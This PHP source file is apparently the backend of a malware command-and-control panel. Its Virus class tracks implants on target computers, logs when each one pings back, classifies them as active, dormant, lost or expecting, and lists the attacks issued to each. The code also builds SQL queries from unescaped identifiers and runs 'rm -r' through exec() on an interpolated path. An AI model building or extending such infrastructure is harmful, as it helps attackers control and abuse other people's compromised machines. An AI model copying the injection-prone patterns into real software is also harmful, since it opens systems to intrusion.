<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\PackageRegistrar;

/**
 * Class Virus
 * @package Kelvinho\Virus
 *
 * Represents a virus. The representation of this will be stored in table viruses, and the data stored on disk is at:
 * DATA_FILE/viruses/{virus_id}/
 *
 * Currently, these are stored on disk:
 * - Profile text, at /profile.txt
 */
class Virus {
    private string $virus_id = "";
    private string $name = "";
    private int $last_ping;
    private string $profile;
    public const VIRUS_ALL = 0; // all viruses
    public const VIRUS_ACTIVE = 1; // viruses that are alive, and pings back quite often
    public const VIRUS_DORMANT = 2; // viruses that are sort of alive, but because the target computer is turned off, it has not pinged back in a while
    public const VIRUS_LOST = 3; // viruses that hasn't pinged back in a long time, and is considered lost
    public const VIRUS_EXPECTING = 4; // viruses that have accessed the entry point, but have not pinged back yet

    private function __construct(string $virus_id) {
        $this->virus_id = $virus_id;
        $this->loadState();
    }

    /**
     * The virus will use this to tell that it's still alive and listening
     */
    public function ping(): void {
        $mysqli = db();
        if ($mysqli->connect_errno) {
            logMysql($mysqli->connect_error);
        }
        $mysqli->query("update viruses set last_ping = " . time() . " where virus_id = \"$this->virus_id\"");
        $mysqli->close();
    }

    public function getVirusId(): string {
        return $this->virus_id;
    }

    public function getName(): string {
        return $this->name;
    }

    public function setName(string $name): void {
        $this->name = $name;
    }

    public function getProfile(): string {
        return $this->profile;
    }

    public function setProfile(string $profile): void {
        $this->profile = $profile;
    }

    public function getLastPing(): int {
        return $this->last_ping;
    }

    /**
     * Deletes the virus permanently.
     */
    public function delete(): void {
        map(Virus::getAttacks($this->virus_id), function ($attack_id) {
            $attack = AttackInterface::get($attack_id);
            $attack->delete();
        });
        $mysqli = db();
        if ($mysqli->connect_errno) {
            logMysql($mysqli->connect_error);
        }
        $mysqli->query("delete from viruses where virus_id = \"$this->virus_id\"");
        $mysqli->close();
        exec("rm -r " . DATA_FILE . "/viruses/$this->virus_id");
    }

    /**
     * Saves the virus state/representation
     */
    public function saveState(): void {
        $mysqli = db();
        if ($mysqli->connect_errno) {
            logMysql($mysqli->connect_error);
        }
        $mysqli->query("update viruses set name = \"" . $mysqli->escape_string($this->name) . "\" where virus_id = \"$this->virus_id\"");
        $mysqli->close();
        file_put_contents(DATA_FILE . "/viruses/$this->virus_id/profile.txt", $this->profile);
    }

    /**
     * Fetch data to restore the state of the virus.
     */
    private function loadState() {
        $mysqli = db();
        if ($mysqli->connect_errno) {
            logMysql($mysqli->connect_error);
        }
        $row = $mysqli->query("select name, last_ping from viruses where virus_id = \"$this->virus_id\"")->fetch_assoc();
        $this->name = $row["name"];
        $this->last_ping = $row["last_ping"];
        $mysqli->close();
        $this->profile = file_get_contents(DATA_FILE . "/viruses/$this->virus_id/profile.txt");
    }

    /**
     * Get attacks as an array.
     *
     * @param string $virus_id The virus id
     * @param string|null $status Optional attack status
     * @param string|null $attack_package Optional attack package name
     * @return array The attacks
     */
    public static function getAttacks(string $virus_id, string $status = null, string $attack_package = null) {
        $whereStatement = "where virus_id = \"" . $virus_id . "\"";
        if ($status != null) {
            if (in_array($status, AttackInterface::STATUSES)) {
                $whereStatement .= " and status = \"$status\"";
            } else {
                logError("Attack status $status does not exist");
            }
        }
        if ($attack_package != null) {
            if (PackageRegistrar::hasPackage($attack_package)) {
                $whereStatement .= " and attack_package = \"$attack_package\"";
            } else {
                logError("Attack package $attack_package does not exist");
            }
        }
        $mysqli = db();
        if ($mysqli->connect_errno) {
            logMysql($mysqli->connect_error);
        }
        $answer = $mysqli->query("select attack_id from attacks $whereStatement order by executed_time desc");
        $mysqli->close();
        $result = [];
        if ($answer) {
            while ($row = $answer->fetch_assoc()) {
                $result[] = $row["attack_id"];
            }
        }
        return $result;
    }

    /**
     * Checks whether the virus id exists or not
     *
     * @param string $virus_id The virus id
     * @return bool Exists?
     */
    public static function exists(string $virus_id): bool {
        $mysqli = db();
        if ($mysqli->connect_errno) {
            logMysql($mysqli->connect_error);
        }
        $answer = $mysqli->query("select virus_id from viruses where virus_id = \"" . $mysqli->escape_string($virus_id) . "\"");
        $mysqli->close();
        if ($answer) {
            $row = $answer->fetch_assoc();
            if ($row) {
                return true;
            }
        }
        return false;
    }

    /**
     * Gets a virus from a virus id. If there are no viruses with that id, it returns null
     *
     * @param string $virus_id The virus id
     * @return Virus|null THe virus
     */
    public static function get(string $virus_id): ?Virus {
        if (self::exists($virus_id)) {
            return new Virus($virus_id);
        } else {
            return null;
        }
    }

    /**
     * Creates a new virus given a user handle
     *
     * @param string $user_handle The user handle
     * @return Virus The virus
     */
    public static function new(string $user_handle): Virus {
        $virus_id = newVirusId();
        $mysqli = db();
        if ($mysqli->connect_errno) {
            logMysql($mysqli->connect_error);
        }
        $mysqli->query("insert into viruses (virus_id, user_handle, last_ping, name, active) values (\"$virus_id\", \"$user_handle\", 0, \"(not set)\", b'0')");
        $mysqli->close();
        mkdir(DATA_FILE . "/viruses/$virus_id");
        touch(DATA_FILE . "/viruses/$virus_id/profile.txt");
        return Virus::get($virus_id);
    }

    public static function getState(int $last_ping): int {
        $currentTime = time();
        if ($last_ping === 0) {
            return self::VIRUS_EXPECTING;
        }
        $delta = $currentTime - $last_ping;
        if ($delta <= VIRUS_PING_INTERVAL * 10) {
            return self::VIRUS_ACTIVE;
        }
        if ($delta <= 2 * 24 * 3600) {
            return self::VIRUS_DORMANT;
        } else {
            return self::VIRUS_LOST;
        }
    }
}